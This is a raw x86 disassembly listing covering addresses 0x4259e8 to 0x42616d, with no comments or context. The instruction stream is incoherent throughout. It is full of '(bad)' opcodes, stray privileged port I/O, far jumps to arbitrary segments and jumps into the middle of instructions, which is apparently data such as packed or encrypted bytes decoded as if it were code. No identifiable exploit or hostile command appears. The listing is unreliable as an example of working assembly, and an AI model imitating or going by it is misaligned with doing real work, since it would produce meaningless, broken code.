  4259e8:	and    esp,DWORD PTR [esp+ebp*1+0x4523a5a9]
  4259ef:	shr    bl,1
  4259f1:	cmp    ebx,DWORD PTR [edx-0x28]
  4259f4:	pop    esp
  4259f5:	xchg   esp,eax
  4259f6:	or     ah,al
  4259f8:	push   es
  4259f9:	fbstp  TBYTE PTR [ecx+0x29]
  4259fc:	pop    ecx
  4259fd:	sbb    eax,0x6349951a
  425a02:	icebp  
  425a03:	fist   DWORD PTR [edi-0x42e5fd84]
  425a09:	jmp    0x4259c3
  425a0b:	(bad)  
  425a0c:	les    ebx,FWORD PTR [edi]
  425a0e:	pushf  
  425a0f:	aaa    
  425a10:	adc    ch,BYTE PTR [ebp+0x14c8ce31]
  425a16:	push   es
  425a17:	xchg   esi,eax
  425a18:	dec    esp
  425a19:	fbstp  TBYTE PTR [eax]
  425a1b:	sbb    ch,BYTE PTR [esi]
  425a1d:	push   0x4d
  425a1f:	bound  edx,QWORD PTR [edi]
  425a21:	enter  0x64fc,0x7e
  425a25:	outs   dx,BYTE PTR ds:[esi]
  425a26:	add    ah,BYTE PTR [ebx+eiz*4]
  425a29:	jmp    0x3253224d
  425a2e:	and    DWORD PTR [ebx-0x3ab26c7f],edi
  425a34:	mov    ecx,0xe1e6bb1d
  425a3a:	in     al,dx
  425a3b:	mov    cl,0x3b
  425a3d:	call   0xdf9171b6
  425a42:	xchg   ebx,eax
  425a43:	jnp    0x4259f1
  425a45:	aam    0xd7
  425a47:	inc    ecx
  425a48:	or     esp,DWORD PTR [esp+edi*8+0x2fc55b61]
  425a4f:	pop    esi
  425a50:	lahf   
  425a51:	out    dx,eax
  425a52:	jo     0x425a0b
  425a54:	loopne 0x4259ef
  425a56:	push   ebp
  425a57:	enter  0xb1d7,0x40
  425a5b:	cmp    eax,0x19fd9246
  425a60:	jae    0x425ad1
  425a62:	mov    ecx,0xb10de6c5
  425a67:	enter  0xbb1f,0x6d
  425a6b:	lock inc esp
  425a6d:	shl    DWORD PTR [eax-0x70],1
  425a70:	jmp    0x58e1:0x8b9bec1f
  425a77:	and    ch,dl
  425a79:	lods   eax,DWORD PTR ds:[esi]
  425a7a:	pushf  
  425a7b:	les    edi,FWORD PTR [eax+edi*8]
  425a7e:	mov    ds:0xe91f3153,eax
  425a83:	add    eax,0x46fd1af1
  425a88:	arpl   WORD PTR [eax-0x46],dx
  425a8b:	jle    0x425a13
  425a8d:	dec    ebp
  425a8e:	pop    eax
  425a8f:	sub    al,0xaf
  425a91:	fist   WORD PTR [ecx-0x47]
  425a94:	pop    esi
  425a95:	jnp    0x425a83
  425a97:	dec    eax
  425a98:	fidivr DWORD PTR [eax]
  425a9a:	std    
  425a9b:	std    
  425a9c:	(bad)  ds:0x5b5536a
  425aa2:	xor    ecx,esp
  425aa4:	out    dx,al
  425aa5:	cmp    BYTE PTR [ebp-0x4c],0xe5
  425aa9:	outs   dx,DWORD PTR ds:[esi]
  425aaa:	in     al,dx
  425aab:	inc    eax
  425aac:	inc    esp
  425aad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425aae:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ab0:	jo     0x425abf
  425ab2:	dec    ebx
  425ab3:	dec    eax
  425ab4:	dec    DWORD PTR [eax]
  425ab6:	mov    esp,ebx
  425ab8:	cmc    
  425ab9:	(bad)  
  425abb:	stos   DWORD PTR es:[edi],eax
  425abc:	sub    cl,cl
  425abe:	adc    DWORD PTR [esi],ebp
  425ac0:	mov    edi,0xb419e2c8
  425ac5:	pop    edi
  425ac6:	jno    0x425a51
  425ac8:	lods   eax,DWORD PTR ds:[esi]
  425ac9:	aaa    
  425aca:	jecxz  0x425adf
  425acc:	aas    
  425acd:	frstor [ecx+0x8]
  425ad0:	in     eax,dx
  425ad1:	mov    bh,0xe4
  425ad3:	outs   dx,DWORD PTR ds:[esi]
  425ad4:	sub    esp,edi
  425ad6:	jecxz  0x425ade
  425ad8:	jmp    0x425a8a
  425ada:	stos   DWORD PTR es:[edi],eax
  425adb:	push   esp
  425adc:	pop    ebx
  425add:	outs   dx,BYTE PTR ds:[esi]
  425ade:	sub    BYTE PTR [ecx-0x4c],dl
  425ae1:	or     DWORD PTR [edi+0x13],ebx
  425ae4:	push   0x1
  425ae6:	data16 jo 0x425a7e
  425ae9:	lds    ebp,FWORD PTR [edx+ebx*2+0x3e]
  425aed:	mov    ds:0xe03d71fc,eax
  425af2:	adc    DWORD PTR [esi+0x6],ecx
  425af5:	or     eax,0x2f9ec865
  425afa:	js     0x425b05
  425afc:	bound  ebp,QWORD PTR [esi+esi*2+0x3e]
  425b00:	mov    al,ds:0xb4b6d0fe
  425b05:	xchg   esp,eax
  425b06:	sti    
  425b07:	mov    al,0x5b
  425b09:	(bad)  
  425b0a:	cmp    al,0xb
  425b0c:	mov    bl,0x2c
  425b0e:	sub    cl,al
  425b10:	loope  0x425b84
  425b12:	int3   
  425b13:	xchg   esi,eax
  425b14:	and    eax,esp
  425b16:	xchg   edx,eax
  425b17:	jns    0x425afc
  425b19:	bound  edi,QWORD PTR [edi-0x3c1399a0]
  425b1f:	jecxz  0x425b0c
  425b21:	push   ss
  425b22:	inc    edi
  425b23:	rcl    BYTE PTR ss:[edi],cl
  425b26:	aam    0xc7
  425b28:	or     eax,0x3d75056e
  425b2d:	push   ebx
  425b2e:	ds and esi,0xa
  425b32:	xchg   ebp,eax
  425b33:	popf   
  425b34:	xor    dl,BYTE PTR [ebx+0x76704370]
  425b3a:	mov    ah,0xc7
  425b3c:	pop    ds
  425b3d:	(bad)  
  425b3e:	dec    ebx
  425b3f:	enter  0x791c,0xc8
  425b43:	(bad)  
  425b44:	fild   WORD PTR [eax-0x7e]
  425b47:	ret    0x1a83
  425b4a:	loope  0x425b77
  425b4c:	push   cs
  425b4d:	fistp  QWORD PTR [ebp+0xd]
  425b50:	fstp   TBYTE PTR [edi-0x1f1e0223]
  425b56:	push   esi
  425b57:	mov    al,ds:0x186a70ac
  425b5c:	mov    al,0xa
  425b5e:	ficomp DWORD PTR [edx-0x15]
  425b61:	mov    eax,0x66a95de8
  425b66:	dec    esp
  425b67:	cmp    eax,0x7ac50b3d
  425b6c:	jmp    0x425b58
  425b6e:	fdiv   QWORD PTR [ecx+0x73]
  425b71:	aam    0xef
  425b73:	sbb    eax,0xeb3ad08b
  425b78:	scas   al,BYTE PTR es:[edi]
  425b79:	xchg   edx,eax
  425b7a:	or     ecx,eax
  425b7c:	dec    ebx
  425b7d:	popf   
  425b7e:	int3   
  425b7f:	imul   esp,DWORD PTR [esi+0x17],0xffffffcf
  425b83:	adc    DWORD PTR ds:0x79eefcd9,0x103adc73
  425b8d:	or     eax,0x58bfc7fa
  425b92:	shl    dh,0xcf
  425b95:	fdiv   DWORD PTR [eax-0x80]
  425b98:	adc    DWORD PTR [esi-0x18],eax
  425b9b:	xchg   ebp,eax
  425b9c:	and    BYTE PTR [edi-0x30],bl
  425b9f:	gs mov edx,0x8e8ea2b5
  425ba5:	fbstp  TBYTE PTR [edi-0x40]
  425ba8:	ret    0xeba3
  425bab:	pushw  0xf3fc
  425baf:	jmp    0x425c2f
  425bb1:	imul   edx,DWORD PTR [edx],0x4f
  425bb4:	fdivr  DWORD PTR [edi]
  425bb6:	adc    esp,DWORD PTR [esi]
  425bb8:	or     DWORD PTR [ebp+0x5247c87f],esp
  425bbe:	fldcw  WORD PTR [edx]
  425bc0:	shl    DWORD PTR [edi],cl
  425bc2:	mov    eax,0x50b7eeca
  425bc7:	pop    edx
  425bc8:	jb     0x425bb5
  425bca:	jl     0x425be7
  425bcc:	dec    ecx
  425bcd:	xchg   ebp,eax
  425bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bcf:	cmc    
  425bd0:	clc    
  425bd1:	jmp    0x425bd9
  425bd3:	push   edi
  425bd4:	ins    DWORD PTR es:[edi],dx
  425bd5:	lahf   
  425bd6:	retf   0x77b1
  425bd9:	mov    ecx,0xb8e6817b
  425bde:	ret    0xb387
  425be1:	ja     0x425b70
  425be3:	and    eax,0xd3cdc47e
  425be8:	fcom   QWORD PTR [ebx]
  425bea:	push   esp
  425beb:	popf   
  425bec:	jmp    0x425bee
  425bee:	mov    dl,0xe4
  425bf0:	in     al,0xe4
  425bf2:	cld    
  425bf3:	outs   dx,DWORD PTR ds:[esi]
  425bf4:	aam    0xf2
  425bf6:	add    bl,BYTE PTR [esi-0x66]
  425bf9:	ffree  st(6)
  425bfb:	enter  0x8be3,0x41
  425bff:	mov    bl,0x0
  425c01:	sbb    BYTE PTR [edx-0x3],al
  425c04:	pop    ds
  425c05:	dec    esi
  425c06:	std    
  425c07:	les    eax,FWORD PTR [edi+0x53]
  425c0a:	and    bl,al
  425c0c:	outs   dx,BYTE PTR ds:[esi]
  425c0d:	push   eax
  425c0e:	ffreep st(7)
  425c10:	sub    BYTE PTR [edi+0x79],ah
  425c13:	jecxz  0x425bf8
  425c15:	mov    gs,WORD PTR [eax+ebp*2]
  425c18:	jmp    0x425bb1
  425c1a:	loope  0x425c66
  425c1c:	mov    ah,0x70
  425c1e:	and    eax,0x57dc7c9c
  425c23:	or     BYTE PTR [ecx+0x3b],0x2e
  425c27:	lds    eax,FWORD PTR [ebx-0x28]
  425c2a:	(bad)  
  425c2b:	dec    ecx
  425c2c:	loope  0x425bd8
  425c2e:	dec    edi
  425c2f:	dec    eax
  425c30:	pop    ebx
  425c31:	test   eax,0x44d48e2a
  425c36:	(bad)  
  425c37:	mov    WORD PTR [edx-0x77],gs
  425c3a:	xor    DWORD PTR [ebx-0x13],edx
  425c3d:	pushf  
  425c3e:	lods   al,BYTE PTR ds:[esi]
  425c3f:	pushf  
  425c40:	or     ecx,ecx
  425c42:	test   BYTE PTR [eax],ah
  425c44:	pop    eax
  425c45:	pop    ds
  425c46:	std    
  425c47:	jge    0x425c4a
  425c49:	aad    0xe9
  425c4b:	stc    
  425c4c:	sub    eax,0x7fc89973
  425c51:	xor    ch,BYTE PTR [edx]
  425c53:	outs   dx,DWORD PTR ds:[esi]
  425c54:	push   ds
  425c55:	cmp    BYTE PTR [edx+edi*2+0x5ef198eb],0x51
  425c5d:	aas    
  425c5e:	outs   dx,BYTE PTR ds:[esi]
  425c5f:	lds    esi,FWORD PTR [ecx]
  425c61:	jmp    0x3254:0x30bb088a
  425c68:	jmp    0x425bf8
  425c6a:	stos   DWORD PTR es:[edi],eax
  425c6b:	adc    BYTE PTR [ecx],dl
  425c6d:	jmp    0x6e04:0x4542c8af
  425c74:	enter  0x4c30,0x8b
  425c78:	xchg   esi,eax
  425c79:	push   ebx
  425c7a:	std    
  425c7b:	test   eax,0x50c6d2ac
  425c80:	mov    eax,ds:0x43c7ee37
  425c85:	leave  
  425c86:	mov    dh,0x3c
  425c88:	jbe    0x425cef
  425c8a:	or     eax,0x4e4debed
  425c8f:	xchg   BYTE PTR [esi-0x28],ah
  425c92:	cdq    
  425c93:	mov    ebp,0x40a4e0af
  425c98:	cwde   
  425c99:	jnp    0x425d0b
  425c9b:	cwde   
  425c9c:	(bad)  
  425c9d:	(bad)
  425ca0:	jmp    0x425ccb
  425ca2:	or     esp,DWORD PTR [ebp+0x51]
  425ca5:	(bad)  
  425ca6:	mov    ah,0x79
  425ca8:	std    
  425ca9:	fucomip st,st(4)
  425cab:	aaa    
  425cac:	sar    DWORD PTR [edx-0x419764ec],0xe0
  425cb3:	adc    BYTE PTR [ebp-0x21],bh
  425cb6:	loop   0x425c9e
  425cb8:	scas   eax,DWORD PTR es:[edi]
  425cb9:	ror    BYTE PTR [edx],1
  425cbb:	sub    al,0x23
  425cbd:	cmp    esi,DWORD PTR [ebp-0x69]
  425cc0:	in     al,dx
  425cc1:	or     DWORD PTR [esi+0x29f0ebbd],edx
  425cc7:	adc    BYTE PTR [eax+0x31],bh
  425cca:	jno    0x425ce5
  425ccc:	jmp    0x425c77
  425cce:	fsub   st(4),st
  425cd0:	in     eax,dx
  425cd1:	mov    ecx,0xdf8a5f2d
  425cd6:	adc    DWORD PTR [edx],edi
  425cd8:	dec    esp
  425cd9:	or     eax,0xcc8eea47
  425cde:	cld    
  425cdf:	arpl   bx,si
  425ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ce2:	aam    0x4d
  425ce4:	outs   dx,BYTE PTR ds:[esi]
  425ce5:	not    BYTE PTR [edi-0x20]
  425ce8:	test   eax,0xb3db842a
  425ced:	pop    ds
  425cee:	scas   al,BYTE PTR es:[edi]
  425cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cf0:	into   
  425cf1:	xchg   edi,eax
  425cf3:	pop    ebp
  425cf4:	jmp    0x425cc7
  425cf6:	mov    ecx,0xa9b0e524
  425cfb:	xchg   ebx,eax
  425cfc:	stc    
  425cfd:	fbstp  TBYTE PTR [esi+0x50]
  425d00:	push   edx
  425d01:	mov    ah,0xbb
  425d03:	daa    
  425d04:	cmp    bh,BYTE PTR [eax-0x3]
  425d07:	or     dl,0xea
  425d0a:	arpl   WORD PTR [edi-0x37349eba],cx
  425d10:	rcr    BYTE PTR [eax+0x4b],1
  425d13:	mov    cl,ah
  425d15:	dec    ebp
  425d16:	(bad)  
  425d18:	jmp    0x425cb7
  425d1a:	aam    0x18
  425d1c:	jmp    0x29a7:0x1251956f
  425d23:	or     ebp,ebx
  425d25:	pop    esi
  425d26:	mov    edx,DWORD PTR [eax+esi*2]
  425d29:	test   BYTE PTR [esi+0x6caaeb84],0xf9
  425d30:	jl     0x425d3a
  425d32:	hlt    
  425d33:	leave  
  425d34:	fcomp  st(7)
  425d36:	cmp    eax,0x95e25adc
  425d3b:	push   eax
  425d3c:	(bad)  [edi-0x76d6df04]
  425d42:	(bad)  
  425d43:	fbld   TBYTE PTR [edx]
  425d45:	cmp    bl,BYTE PTR [ecx-0x61]
  425d48:	mov    edi,0x3767f53f
  425d4d:	push   ebp
  425d4e:	pop    eax
  425d4f:	enter  0x679b,0x25
  425d53:	or     eax,0xb3e30b8f
  425d58:	out    0x2,eax
  425d5a:	in     eax,dx
  425d5b:	cmp    esp,DWORD PTR [ebx+esi*4]
  425d5e:	jge    0x425d64
  425d60:	pop    edx
  425d61:	fsubr  QWORD PTR [edx+esi*2]
  425d64:	dec    esp
  425d65:	fsubr  DWORD PTR [ebx]
  425d67:	mov    ah,dh
  425d69:	mov    esp,0x72b6049c
  425d6e:	out    dx,eax
  425d6f:	(bad)  
  425d70:	jmp    0x425dea
  425d72:	lock int3 
  425d74:	loope  0x425d9f
  425d76:	xor    eax,0x50df3650
  425d7b:	add    esp,eax
  425d7d:	stos   BYTE PTR es:[edi],al
  425d7e:	dec    ebx
  425d7f:	push   esi
  425d80:	lods   al,BYTE PTR ds:[si]
  425d82:	and    BYTE PTR [esi],bh
  425d84:	jmp    0x425d39
  425d86:	out    0xdd,al
  425d88:	push   0x6e
  425d8a:	pop    ecx
  425d8b:	pop    edi
  425d8c:	and    bh,bl
  425d8e:	add    eax,0xa0bf8f7a
  425d93:	inc    edx
  425d94:	mov    ch,0x23
  425d96:	hlt    
  425d97:	jnp    0x425dec
  425d99:	mov    ebp,0xa4e7a7f0
  425d9e:	and    al,0xca
  425da0:	aas    
  425da1:	retf   
  425da2:	or     al,0x22
  425da4:	pop    ebx
  425da5:	fbld   TBYTE PTR [esi-0x7c]
  425da8:	lods   al,BYTE PTR ds:[esi]
  425da9:	push   edx
  425daa:	in     al,dx
  425dab:	cmp    dh,BYTE PTR [ebx-0xbc0297]
  425db1:	loop   0x425dfa
  425db3:	push   cs
  425db4:	xor    DWORD PTR [edx],ebp
  425db6:	(bad)  
  425db7:	(bad)  
  425db8:	lods   eax,DWORD PTR ds:[esi]
  425db9:	call   0x9ecf:0x4ad80c0f
  425dc0:	jmp    0x425e18
  425dc2:	aas    
  425dc3:	out    dx,al
  425dc4:	pop    edi
  425dc5:	stos   BYTE PTR es:[edi],al
  425dc6:	adc    dh,BYTE PTR [eax-0xf]
  425dc9:	fist   WORD PTR [edx+0x2db36504]
  425dcf:	sub    dl,ah
  425dd1:	idiv   ebx
  425dd3:	ins    BYTE PTR es:[edi],dx
  425dd4:	sbb    BYTE PTR [ecx-0x17],ch
  425dd7:	jmp    0x95246977
  425ddc:	mov    ds:0xa77f2fdf,al
  425de1:	inc    ebp
  425de2:	sbb    BYTE PTR [esi],0x8
  425de5:	add    DWORD PTR [bx+si],edx
  425de8:	imul   eax,DWORD PTR [edi],0xfffffffd
  425deb:	jnp    0x425e3b
  425ded:	mov    al,0xc8
  425def:	mov    ds:0x71a5d9b8,eax
  425df4:	imul   esi,DWORD PTR [esp+ebx*1+0x589cdb69],0x6c8eebfb
  425dff:	test   eax,0x5fd61ead
  425e04:	rcr    bh,1
  425e06:	xchg   ebx,eax
  425e07:	lahf   
  425e08:	mov    dl,0x69
  425e0a:	rcl    DWORD PTR [edi],cl
  425e0c:	dec    eax
  425e0d:	push   esi
  425e0e:	stos   DWORD PTR es:[edi],eax
  425e0f:	lods   al,BYTE PTR ds:[esi]
  425e10:	jmp    0x425e70
  425e12:	ja     0x425dfb
  425e14:	sub    edi,DWORD PTR [edx+0x4f]
  425e17:	push   eax
  425e18:	lahf   
  425e19:	fbstp  TBYTE PTR [esi]
  425e1b:	jbe    0x425e7d
  425e1d:	jl     0x425de2
  425e1f:	mov    DWORD PTR [ecx],edi
  425e21:	push   ds
  425e22:	repz addr16 iret 
  425e25:	push   eax
  425e26:	sub    al,ch
  425e28:	aaa    
  425e29:	arpl   WORD PTR [edx+ebp*1+0x1c],bp
  425e2d:	stos   DWORD PTR es:[edi],eax
  425e2e:	or     esp,DWORD PTR [eax+0x541d58eb]
  425e34:	mov    fs,WORD PTR [edx-0xe67eefc]
  425e3a:	cld    
  425e3b:	retf   0x76a5
  425e3e:	test   eax,0x9432491e
  425e43:	enter  0xd9c,0x78
  425e47:	cmp    DWORD PTR [esi-0x17730b0],edi
  425e4d:	and    DWORD PTR [eax-0x3c],ebx
  425e50:	mov    bh,0xfc
  425e52:	jbe    0x425e1c
  425e54:	and    DWORD PTR [eax-0x38],esi
  425e57:	pop    esi
  425e58:	aas    
  425e59:	inc    esi
  425e5a:	dec    edi
  425e5b:	enter  0x98fb,0x75
  425e5f:	in     al,0x3
  425e61:	dec    edx
  425e62:	jp     0x425e38
  425e64:	jmp    0x6da6:0x789239f4
  425e6b:	sbb    BYTE PTR [ebp+0x54c82ce3],ch
  425e71:	pop    ds
  425e72:	mov    ecx,0xba30847
  425e77:	push   esi
  425e78:	in     al,dx
  425e79:	sub    eax,0x8e10a4f6
  425e7e:	add    ch,BYTE PTR [eax-0x380868c1]
  425e84:	jnp    0x425eaf
  425e86:	xchg   edi,eax
  425e87:	push   eax
  425e88:	js     0x425e8b
  425e8a:	aam    0x25
  425e8c:	jmp    0x425e95
  425e8e:	ds fcomip st,st(6)
  425e91:	sub    al,0x4
  425e93:	jmp    0x95423e7e
  425e98:	jge    0x425ebf
  425e9a:	arpl   bp,ax
  425e9c:	retf   
  425e9d:	xchg   edx,eax
  425e9e:	(bad)  
  425e9f:	sbb    bl,BYTE PTR [ebx+edx*4+0x5f]
  425ea3:	sub    bl,cl
  425ea5:	or     al,0x99
  425ea7:	jns    0x425ead
  425ea9:	loopne 0x425efd
  425eab:	cmp    eax,0xf0760684
  425eb0:	cdq    
  425eb1:	cmp    eax,DWORD PTR [edx+eax*1]
  425eb4:	push   edi
  425eb5:	jo     0x425e74
  425eb7:	mov    dl,0x49
  425eb9:	retf   
  425eba:	xchg   BYTE PTR [ecx-0x2bee17a0],al
  425ec0:	stc    
  425ec1:	push   ds
  425ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ec3:	aad    0xfa
  425ec5:	and    edi,DWORD PTR [edi+0xa5c2f4]
  425ecb:	xlat   BYTE PTR ds:[ebx]
  425ecc:	cmp    eax,0x6fc0fbab
  425ed1:	jmp    0x425ec0
  425ed3:	sar    DWORD PTR [esi],0x50
  425ed6:	fld    QWORD PTR [edi]
  425ed8:	cmp    ecx,DWORD PTR [edx]
  425eda:	(bad)  [esi+ebp*8]
  425edd:	imul   edi,DWORD PTR [esp],0x2b
  425ee1:	lods   eax,DWORD PTR ds:[esi]
  425ee2:	or     edx,esi
  425ee4:	or     eax,0x86aefd66
  425ee9:	cmp    eax,0x7a2eec5
  425eee:	mov    dh,0xc8
  425ef0:	repnz cld 
  425ef2:	inc    edx
  425ef3:	mov    bh,dl
  425ef5:	ret    0xfbee
  425ef8:	jmp    0x425f3f
  425efa:	xchg   ebx,eax
  425efb:	or     edi,ecx
  425efd:	jbe    0x425f0a
  425eff:	call   0xdf19:0xa36c0a78
  425f06:	xlat   BYTE PTR ds:[ebx]
  425f07:	icebp  
  425f08:	pop    edi
  425f09:	adc    ch,BYTE PTR [edx-0x56]
  425f0c:	fld    DWORD PTR [edx+edi*8-0x41ca48c1]
  425f13:	mov    esi,0xe6d4c72b
  425f18:	cmp    edi,ebx
  425f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f1b:	pop    ds
  425f1c:	mov    WORD PTR [ebx+0x60cb893],cs
  425f22:	std    
  425f23:	(bad)  
  425f24:	in     eax,0x76
  425f26:	shld   edx,ebp,0x4d
  425f2a:	jl     0x425ef3
  425f2c:	mov    ecx,0x9de4dd04
  425f31:	out    dx,eax
  425f32:	xlat   BYTE PTR ds:[ebx]
  425f33:	jbe    0x425efe
  425f35:	push   ecx
  425f36:	std    
  425f37:	shr    esp,1
  425f39:	(bad)  
  425f3a:	in     al,dx
  425f3b:	retf   0x3a48
  425f3e:	push   ecx
  425f3f:	enter  0xa8da,0xdb
  425f43:	test   al,0xfa
  425f45:	fistp  DWORD PTR [eax-0x53090dce]
  425f4b:	(bad)  
  425f4c:	jecxz  0x425f2d
  425f4e:	jecxz  0x425eed
  425f50:	inc    ebp
  425f51:	sahf   
  425f52:	imul   edx,DWORD PTR [eax+0x3fd887d],0x51e5cb41
  425f5c:	cvtps2pi mm7,xmm5
  425f5f:	in     al,dx
  425f60:	pop    ss
  425f61:	jnp    0x425f97
  425f63:	ficom  WORD PTR [ecx]
  425f65:	out    dx,eax
  425f66:	mov    ecx,esi
  425f68:	stc    
  425f69:	mov    ebp,DWORD PTR [esi+ebp*4]
  425f6c:	mov    eax,DWORD PTR [edx]
  425f6e:	inc    eax
  425f6f:	stc    
  425f70:	retfw  
  425f72:	cmc    
  425f73:	and    eax,0x4465922c
  425f78:	loopne 0x425f61
  425f7a:	mov    ebp,0x9d290afa
  425f7f:	push   ds
  425f80:	bound  esp,QWORD PTR [edi+0x25]
  425f83:	mov    ebp,0x81f16bd
  425f88:	dec    eax
  425f89:	aad    0x31
  425f8b:	pop    eax
  425f8c:	push   cs
  425f8d:	cmc    
  425f8e:	cli    
  425f8f:	mov    al,ds:0x183e5138
  425f94:	aaa    
  425f95:	shr    BYTE PTR [esi],1
  425f97:	enter  0x744c,0x2a
  425f9b:	mov    WORD PTR [ecx+0x7a],?
  425f9e:	xlat   BYTE PTR ds:[ebx]
  425f9f:	xor    eax,0x26d450eb
  425fa4:	aaa    
  425fa5:	dec    esi
  425fa6:	les    edx,FWORD PTR [edx-0x377fb443]
  425fac:	icebp  
  425fad:	(bad)  
  425fae:	jmp    0x425f6d
  425fb0:	popf   
  425fb1:	jmp    0xa992:0x55ebee94
  425fb8:	fcomp  DWORD PTR [esi+0x16]
  425fbb:	jo     0x42603a
  425fbd:	leave  
  425fbe:	outs   dx,DWORD PTR ds:[esi]
  425fbf:	(bad)  
  425fc0:	dec    ebp
  425fc1:	aam    0x32
  425fc3:	adc    al,0xef
  425fc5:	jg     0x425f95
  425fc7:	xchg   edx,eax
  425fc8:	in     al,dx
  425fc9:	mov    ebx,0xb28cb4fc
  425fce:	inc    edx
  425fcf:	(bad)  [ebp+0x14]
  425fd2:	jge    0x425fb6
  425fd4:	jb     0x426043
  425fd6:	jge    0x425f72
  425fd8:	fiadd  WORD PTR [eax-0x289df66]
  425fde:	sub    eax,DWORD PTR [edi]
  425fe0:	in     eax,dx
  425fe1:	ss data16 cmp al,0x82
  425fe5:	imul   edi,esp,0x5ffadf9b
  425feb:	fisub  WORD PTR [edi+ebp*1-0x143f693e]
  425ff2:	fist   WORD PTR [eax]
  425ff4:	jb     0x425f95
  425ff6:	in     al,dx
  425ff7:	add    edi,0xf1055fb1
  425ffd:	or     ch,cl
  425fff:	idiv   BYTE PTR ss:[eax-0x3]
  426003:	mov    eax,0x9c1ae32
  426008:	mov    ebp,0xd09d8df
  42600d:	dec    ebp
  42600e:	int    0x9d
  426010:	and    esp,DWORD PTR [eax]
  426012:	(bad)  
  426013:	repz xor dl,dl
  426016:	(bad)  
  426017:	call   0x7dcb:0xefb9d6ec
  42601e:	mov    cl,al
  426020:	loop   0x426024
  426022:	cmp    al,0xdd
  426024:	je     0x426007
  426026:	pop    esp
  426027:	mov    edx,0x4fa58dee
  42602c:	or     al,0x3f
  42602e:	mov    bh,0x44
  426030:	add    al,dl
  426032:	pop    eax
  426033:	out    0xa,al
  426035:	jb     0x425ffd
  426037:	loopne 0x4260a4
  426039:	cmc    
  42603a:	xchg   esp,eax
  42603b:	mov    ds:0xd3f48749,al
  426040:	cli    
  426041:	inc    ebx
  426042:	mov    cl,0xfc
  426044:	out    0x10,al
  426046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426047:	lds    ebx,FWORD PTR [ebx]
  426049:	mov    dh,0x14
  42604b:	retf   0xdfa9
  42604e:	push   edx
  42604f:	add    dh,bl
  426051:	adc    dh,BYTE PTR [esp+ebp*2+0xb]
  426055:	or     esi,DWORD PTR [bp+si-0x77]
  426059:	mov    esi,?
  42605b:	test   DWORD PTR [eax+0x76d731d],esi
  426061:	stc    
  426062:	stc    
  426063:	and    eax,ebx
  426065:	fistp  QWORD PTR [esi]
  426067:	add    edi,DWORD PTR [ecx]
  426069:	xlat   BYTE PTR ds:[ebx]
  42606a:	jge    0x4260d2
  42606c:	fist   DWORD PTR [edx-0x3]
  42606f:	inc    esp
  426070:	or     al,0x5f
  426072:	pop    es
  426073:	mov    dl,0x9f
  426075:	mov    eax,0x5d3fc5bb
  42607a:	int    0x22
  42607c:	xor    ebx,DWORD PTR [ecx+ecx*1]
  42607f:	xchg   BYTE PTR [ebx+0xf],bl
  426082:	jae    0x426060
  426084:	out    0x30,al
  426086:	push   ebx
  426087:	pop    ebp
  426088:	retf   
  426089:	push   cs
  42608a:	or     al,0xd7
  42608c:	mov    edx,0xf3100b68
  426091:	out    dx,eax
  426092:	sti    
  426093:	mov    edx,0xc7d72031
  426098:	adc    ebp,0x46
  42609b:	mov    al,ds:0x1afc4274
  4260a0:	ins    BYTE PTR es:[edi],dx
  4260a1:	popf   
  4260a2:	cmc    
  4260a3:	and    BYTE PTR [esi],dl
  4260a5:	ror    DWORD PTR [edi+eax*8],cl
  4260a8:	dec    ebp
  4260a9:	ja     0x4260b8
  4260ab:	enter  0xb726,0xce
  4260af:	scas   al,BYTE PTR es:[edi]
  4260b0:	call   0xea95160e
  4260b5:	xchg   ebx,eax
  4260b6:	pop    edx
  4260b7:	rcr    DWORD PTR [ebx-0x3d],0x9e
  4260bb:	or     ebx,DWORD PTR [ecx+0x7f]
  4260be:	fsub   DWORD PTR ds:0xc86fd38e
  4260c4:	dec    esi
  4260c5:	dec    edx
  4260c6:	mov    ebp,0x5acf5ebe
  4260cb:	std    
  4260cc:	jmp    0x4260d4
  4260ce:	sbb    eax,0x9b5ba88c
  4260d3:	mov    al,ds:0x9f61df51
  4260d8:	jecxz  0x4260c1
  4260da:	in     al,dx
  4260db:	arpl   dx,di
  4260dd:	adc    dl,bl
  4260df:	test   al,0x8e
  4260e1:	ret    0x3dfd
  4260e4:	sub    DWORD PTR [edi-0x6b],ecx
  4260e7:	sbb    BYTE PTR [ebx-0x4f381996],0xdb
  4260ee:	adc    ah,BYTE PTR [ebp-0x4b]
  4260f1:	pop    eax
  4260f2:	add    DWORD PTR [esi+0x5f0ec7eb],esp
  4260f8:	int3   
  4260f9:	shl    ecx,1
  4260fb:	adc    eax,0xc448de0f
  426100:	dec    ebx
  426101:	push   esi
  426102:	lea    esp,[edi+0x6e134f70]
  426108:	in     al,dx
  426109:	test   DWORD PTR [edx+0x36],ecx
  42610c:	or     BYTE PTR [eax+0x6c],bh
  42610f:	mov    ?,WORD PTR [edi]
  426111:	or     al,BYTE PTR [ecx]
  426113:	js     0x426170
  426115:	xchg   edx,eax
  426116:	push   edi
  426117:	enter  0x3de7,0x6e
  42611b:	mov    eax,ds:0x75f48373
  426120:	jmp    0xbf13:0x45684190
  426127:	sbb    BYTE PTR [esi+0x79],ch
  42612a:	in     eax,0xce
  42612c:	ins    BYTE PTR es:[edi],dx
  42612d:	imul   esi,ebx,0x148cab87
  426133:	add    edi,DWORD PTR [ebx-0x7c]
  426136:	(bad)  
  426137:	hlt    
  426138:	xchg   esi,eax
  426139:	sbb    edx,DWORD PTR [esi-0x75]
  42613c:	push   edi
  42613d:	sub    ebp,ebp
  42613f:	ds (bad) 
  426141:	(bad)  
  426143:	test   eax,0x21a10c6f
  426148:	es nop
  42614a:	std    
  42614b:	jle    0x4261bf
  42614d:	cmp    al,0x19
  42614f:	lahf   
  426150:	ror    BYTE PTR [edx-0x56],cl
  426153:	retf   0xeadb
  426156:	fst    QWORD PTR [edi+0x32]
  426159:	jae    0x426198
  42615b:	sub    al,0x57
  42615d:	ja     0x4261cc
  42615f:	inc    edi
  426160:	jmp    0x4261cd
  426162:	psubd  mm1,mm6
  426165:	(bad)  [ebp-0x2f]
  426168:	xchg   ebx,eax
  426169:	fild   WORD PTR [edx]
  42616b:	mov    ch,al
  42616d:	iret   
